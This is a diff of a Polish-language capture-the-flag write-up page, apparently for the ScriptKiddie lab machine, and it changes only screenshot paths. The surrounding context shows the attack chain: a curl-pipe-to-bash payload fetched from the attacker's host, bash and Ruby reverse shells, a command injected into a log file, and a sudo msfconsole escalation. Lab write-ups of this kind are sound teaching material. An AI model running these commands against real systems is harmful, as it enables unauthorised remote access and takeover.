@@ -244,22 +244,22 @@
 |_http-title: k1d<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#ae81ff">5</span> h4ck3r t00l5
 </code></pre></div><hr>
 <h1 id="strona-główna">Strona główna<a hidden class="anchor" aria-hidden="true" href="#strona-główna">#</a></h1>
-<p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020210830022800.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020210830022800.png" alt=""  />
 </p>
 <hr>
 <h1 id="searchsploit">Searchsploit<a hidden class="anchor" aria-hidden="true" href="#searchsploit">#</a></h1>
-<p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020210830181031.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020210830181031.png" alt=""  />
 </p>
 <p>Można spróbować wykorzystać sam msfvenom, który jest używany przez stronę, ten exploit umożliwa wykonywanie komend.</p>
-<p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020210830181142.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020210830181142.png" alt=""  />
 </p>
 <p><code>payload = 'curl http://10.10.14.23:8081/test.sh|bash'</code></p>
-<p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020210830181203.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020210830181203.png" alt=""  />
 </p>
 <p>Jak widać, serwer próbuje pobrać plik test.sh. Teraz wystarczy umieścić tam kod reverse shella na ustalony port.</p>
 <p>np.<code>bash -i &gt;&amp; /dev/tcp/10.10.14.23/4444 0&gt;&amp;1</code></p>
 <p>Momentalnie otrzymany został shell.</p>
-<p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020210830181303.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020210830181303.png" alt=""  />
 </p>
 <p>user.txt</p>
 <p><code>f7bf63abec2ca5fd2f15cc7865ced787</code></p>
@@ -286,7 +286,7 @@ cat $log | cut -d<span style="color:#e6db74">&#39; &#39;</span> -f3- | sort -u |
 <p>cut -d ' ' ucina po spacjach, więc potrzebne będą słowa &ldquo;zapychacze&rdquo;. Wykorzystać można poprzedni plik test.sh z reverse shellem.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">echo <span style="color:#e6db74">&#34;slowo1 slowo2 ;curl http://10.10.14.23:8081/test.sh|bash #&#34;</span> &gt; hackers
 </code></pre></div><p>Otrzymany shell:</p>
-<p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020210831183329.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020210831183329.png" alt=""  />
 </p>
 <hr>
 <h1 id="privilege-escalation">Privilege Escalation<a hidden class="anchor" aria-hidden="true" href="#privilege-escalation">#</a></h1>
@@ -302,7 +302,7 @@ User pwn may run the following commands on scriptkiddie:
 </code></pre></div><p>Prosta droga do roota</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo msfconsole 										W TEORII JUŻ JEST POSIADANY ROOT I MOŻNA ODCZYTAĆ FLAGĘ, ALE DLA CZYTELNOŚCI MOŻNA STWORZYĆ NOWY SHELL
 ruby -rsocket -e<span style="color:#e6db74">&#39;exit if fork;c=TCPSocket.new(&#34;10.0.0.1&#34;,&#34;4242&#34;);loop{c.gets.chomp!;(exit! if $_==&#34;exit&#34;);($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts &#34;failed: #{$_}&#34;}&#39;</span>
-</code></pre></div><p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020210831183949.png" alt=""  />
+</code></pre></div><p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020210831183949.png" alt=""  />
 </p>
 <p>EDIT:</p>
 <p>WYSTARCZYŁO WPISAĆ <code>/bin/sh</code> albo <code>irb</code> (interaktywny shell ruby)</p>
